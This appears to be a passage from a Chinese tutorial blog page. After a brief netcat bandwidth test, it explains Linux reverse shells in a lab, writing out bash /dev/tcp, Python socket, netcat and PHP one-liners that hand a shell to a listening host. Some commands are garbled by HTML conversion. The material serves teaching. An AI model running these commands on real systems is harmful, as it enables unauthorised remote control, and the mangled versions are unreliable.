步骤1，A机器先启动接收数据的命令，监听自己的9991端口，把来自这个端口的数据都输出给空设备（这样不写磁盘，测试网速更准确）<br />
nc -l 9991 &gt;/dev/null</p>

<p>步骤2，B机器发送数据，把无限个0发送给A机器的9991端口<br />
nc 10.0.1.161 9991</p>

<p>在复制的窗口上使用dstat命令查看当前网速，dstat命令比较直观，它可以查看当前cpu，磁盘，网络，内存页和系统的一些当前状态指标。<br />
我们只需要看下面我选中的这2列即可，recv是receive的缩写，表示接收的意思，send是发送数据，另外注意数字后面的单位B，KB，MB</p>

<p>可以看到A机器接收数据，平均每秒400MB左右</p>

<p>B机器新打开的窗口上执行dstat，看到每秒发送400MB左右的数据</p>

<p>方法2，测试网速演示（先启动发送命令方式）<br />
步骤1，先启动发送的数据，谁连接这个端口时就会接收来自zero设备的数据（二进制的无限个0）<br />
nc -l 9990</p>

<p>步骤2，下面B机器连接A机器的9990端口，把接收的数据输出到空设备上<br />
nc 10.0.1.161 9990 &gt;/dev/null</p>

<p>同样可以使用dstat观察数据发送时的网速<br />
13. linux渗透之反弹shell<br />
实验环境<br />
CentOS 6.5：192.168.0.3</p>

<p>kali2.0：192.168.0.4</p>

<p>方法1：<br />
反弹shell命令如下：</p>

<p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br />
首先，使用nc在kali上监听端口：</p>

<p>nc -lvp 7777<br />
0DdE723LF1.png</p>

<p>然后在CentOS6.5下输入：</p>

<p>bash -i &gt;&amp; /dev/tcp/192.168.0.<sup>4</sup>&frasl;<sub>7777</sub> 0&gt;&amp;1<br />
B9l36f21h6.png</p>

<p>可以看到shell成功反弹到了kali上面，可以执行命令：</p>

<p>35JfJKF24L.png</p>

<p>在解释这条反弹shell的命令原理之前，首先需要掌握几个点。</p>

<p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p>

<p>0 - stdin 代表标准输入,使用 1 - stdout 代表标准输出,使用&gt;或&gt;&gt;<br />
2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;<br />
还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p>

<p>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。<br />
当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符<br />
也有师傅把&amp;这个符号解释为是取地址符号，学过C语言的小伙伴们都知道&amp;这个符号代表取地址符，在C++中&amp;符号还代表为引用，这样做是为了区分文件描述符和文件，比如查看一个不存在的文件，要把标准错误重定向到标准输出，如果直接cat
notexistfile 2&gt;1的话，则会将1看作是一个文件，将标准错误输出输出到1这个文件里而不是标准输出,而&amp;的作用就是为了区分文件和文件描述符：</p>

<p>9gLL6Ih539.png</p>

<p>理解了上面这些知识，下面来解释一下这一条反弹shell的命令首先，bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port，
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程。</p>

<p>jA18Hi8L77.png</p>

<p>在本地输入设备（键盘）输入命令，在本地看不到输入的内容，但是键盘输入的命令已经被输出到了远程，然后命令的执行结果或者错误也会被传到远程，查看远程，可以看到标准输出和标准错误输出都重定向到了远程：</p>

<p>0g2Im6dj72.png</p>

<p>下面在该命令后面加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了：</p>

<p>Ad1dIgeg9K.png</p>

<p>iHaH464C61.png</p>

<p>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程：</p>

<p>AeA8baLFEc.png</p>

<p>32KC81aH0J.png</p>

<p>为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向：</p>

<p>I9E4l0E31l.png执行bash -i &gt;&amp; /dev/tcp/ip/port后</p>

<p>F38m9Hlg48.png</p>

<p>执行bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1或者bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2后：</p>

<p>iG2h7i1g7D.png</p>

<p>方法2：<br />
使用python反弹，反弹shell命令如下：</p>

<p>python -c “import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘ip’,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([’/bin/bash’,’-i’]);”<br />
首先，使用nc在kali上监听端口：</p>

<p>nc -lvp 7777<br />
H2IlCDa6j2.png</p>

<p>在CentOS下使用python去反向连接，输入：</p>

<p>python -c &ldquo;import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.0.4’,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([’/bin/bash’,’-i’]);<br />
e7kde87mKE.png可以看到kali上成功反弹到了shell，可以执行一些命令：</p>

<p>Ek7JD4eGeh.png</p>

<p>在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理。</p>

<p>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3。</p>

<p>C2adcJcjIh.png</p>

<p>于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了。</p>

<p>方法3：<br />
使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下：</p>

<p>复制代码<br />
1、下载安装<br />
wget
<a href="https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download">https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</a><br />
tar -zxvf netcat-0.7.1.tar.gz -C /usr/local<br />
cd /usr/local<br />
mv netcat-0.7.1 netcat<br />
cd /usr/local/netcat<br />
./configure<br />
make &amp;&amp; make install<br />
2、配置<br />
vim /etc/profile<br />
添加以下内容：</p>

<h1 id="set-netcat-path">set netcat path</h1>

<p>export NETCAT_HOME=/usr/local/netcat<br />
export PATH= P A T H : PATH: PATH:NETCAT_HOME/bin<br />
保存，退出，并使配置生效：<br />
source /etc/profile<br />
3、测试<br />
nc -help成功<br />
复制代码<br />
L3k8cCbd4I.png</p>

<p>之后在kali上使用nc监听端口：</p>

<p>nc -lvp 7777<br />
4JlKI8AAa8.png</p>

<p>在CentOS上使用nc去反向连接，命令如下：</p>

<p>nc -e /bin/bash 192.168.0.4 7777<br />
lk26I81B39.png这里的-
e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p>

<p>G0j42BbeEI.png</p>

<p>注意之前使用nc监听端口反弹shell时都会有一个警告：Warning: forward host lookup failed for bogon:
Unknown host,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。</p>

<p>nc -nlvp 7777<br />
bDJ9Ah33Lj.png</p>

<p>如果nc不支持-e参数的话，可以利用到linux中的管道符，首先在kali上开启监听：</p>

<p>nc -nvlp 6666</p>

<p>nc -nvlp 7777</p>

<p>6Gf87b2g0c.png</p>

<p>之后在CentOS上使用nc去反向链接：</p>

<p>nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777<br />
8ab45ddDa8.pngiliCEIg5cL.png这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口。</p>

<p>bCG25adDFg.png</p>

<p>方法4：<br />
使用php反弹shell，方法如下 。<br />
首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令：</p>

<p>php- ‘exec(&ldquo;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.<sup>4</sup>&frasl;<sub>7777</sub>&rdquo;)’<br />
AfJ3e8GI2i.pngDa1d5I1GgL.png</p>

<p>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>

<p>php -r ‘$sock=fsockopen(“ip”,port);exec(&ldquo;/bin/bash -i &amp;3 2&gt;&amp;3&rdquo;);’<br />
fmLfgB7mg1.pngJbLmF1b3l9.png</p>

<p>这个姿势看起来有一些难以理解，尤其是还出现了</p>

<p>有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程</p>

<p>在CentOS上反向连接，输入：</p>

<p>php -r ‘$sock=fsockopen(“192.168.0.4”,7777);exec(&ldquo;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3
2&gt;&amp;3&rdquo;);’<br />
1H1Ie6D8Hg.pngB0c9GjFmD5.png注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数。</p>

<p>总结<br />
写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s
the climb！</p>

        </div>

        


        

<div class="post-archive">
    <h2>See Also</h2>
    <ul class="listing">
        
        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
        
        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
        
        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
        
        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
        
        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
        
    </ul>
</div>


        <div class="post-meta meta-tags">
            
            <ul class="clearfix">
                
                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
                
            </ul>
            
        </div>
    </article>
    
    

    
    
</div>

                    <footer id="footer">
    <div>
        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
        
    </div>
    <br />
    <div>
        <div class="github-badge">
            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
        </div>
        <div class="github-badge">
            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
        </div>
        <div class="github-badge">
            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
        </div>
    </div>
</footer>


    
    <script type="text/javascript">
        window.MathJax = {
            tex2jax: {
                inlineMath: [['$', '$']],
                processEscapes: true
                }
            };
    </script>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>

<a id="rocket" href="#top"></a>
<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>



    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>




                </div>

                <div id="secondary">
    <section class="widget">
        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
      
      <input type="text" name="q" maxlength="20" placeholder="Search">
      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
      <button type="submit" class="submit icon-search"></button>
</form>
    </section>
    
    <section class="widget">
        <h3 class="widget-title">最近文章</h3>
<ul class="widget-list">
    
    <li>
        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
    </li>
    
</ul>
    </section>

    

    <section class="widget">
        <h3 class="widget-title"><a href="/categories">分类</a></h3>
<ul class="widget-list">
    
</ul>
    </section>

    <section class="widget">
        <h3 class="widget-title"><a href="/tags">标签</a></h3>
<div class="tagcloud">
    
    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
    
    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
    
</div>
    </section>

    

    <section class="widget">
        <h3 class="widget-title">其它</h3>
        <ul class="widget-list">
            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
        </ul>
    </section>
</div>
            </div>
        </div>
    </div>
</body>

</html>